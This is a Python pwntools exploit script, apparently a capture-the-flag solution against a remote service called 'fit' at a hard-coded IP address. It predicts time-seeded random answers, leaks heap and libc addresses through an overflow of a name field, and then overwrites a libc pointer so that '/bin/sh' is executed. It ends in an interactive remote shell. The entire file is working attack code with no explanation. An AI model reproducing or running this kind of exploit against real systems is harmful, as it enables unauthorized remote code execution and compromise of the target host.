from pwn import *
from ctypes import *

lib = CDLL("/lib/x86_64-linux-gnu/libc.so.6") # libc addres
#p = process("./fit")#,env={"LD_PRELPAD":"./libc.so.6"})
#p = remote("127.0.0.1",5333)
p = remote("20.214.202.215",5333)
lib.srand(lib.time(0))
#context.log_level=1

def make_ans():
    tmp = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
    ans = ''
    for i in range(20):
        ans += tmp[lib.rand()%62]
    return ans
#1
for _ in range(5):
    p.recvuntil("Input")
    p.sendline(make_ans())
p.recvuntil("Name")
sleep(0.2)
p.send("AB"*12)
p.send("y")
sleep(0.3)
#context.log_level =1
#2
for _ in range(5):
    p.recvuntil("Input")
    p.sendline(make_ans())
#pause()
p.recvuntil("Name")
p.send("A"*0x18)
p.recvuntil("1.")
p.recvuntil("AB"*12)
temp = p.recv(12)
temp2 = ''
for x in temp:
    print(hex(x))
x =0
while len(temp2) != 6:
    if temp[x] == 0x5e:
        temp2 +=  chr(temp[x+1]-0x40)
        x += 2
    elif temp[x] == 0x7e:
        temp2 +=  chr(temp[x+1]+0x40)
        x +=2
    elif temp[x] == 0xc2:
        x += 1
    else:
        temp2 += chr(temp[x])
        x +=1
temp = temp2
print("--")
for x in temp:
    print(hex(ord(x)))
heap = 0
for x in range(6):
    heap += ord(temp[x]) << (8*x)
heap -=  0xdae0
log.info(hex(heap))
p.send("y")



#3
context.log_level=1
for _ in range(5):
    p.recvuntil("Input")
    p.sendline(make_ans())
p.recvuntil("Name")
p.send(b"a"*0x18+p64(heap+0x1168))
p.recvuntil("4.")
p.recvuntil("53H")
libc = int(p.recvuntil(".",drop=True))  - 0x1f35e0
log.info(hex(libc))
p.send("y")

#4
sleep(0.5)
for _ in range(5):
    p.recvuntil("Input")
    p.sendline(make_ans())
p.recvuntil("Name")
p.send(b"/bin/sh;"*3+p64(libc+0x1f6080-0x10))
p.send("n")
p.sendline("4")
p.send(p64(libc+0x4e520))

p.interactive()
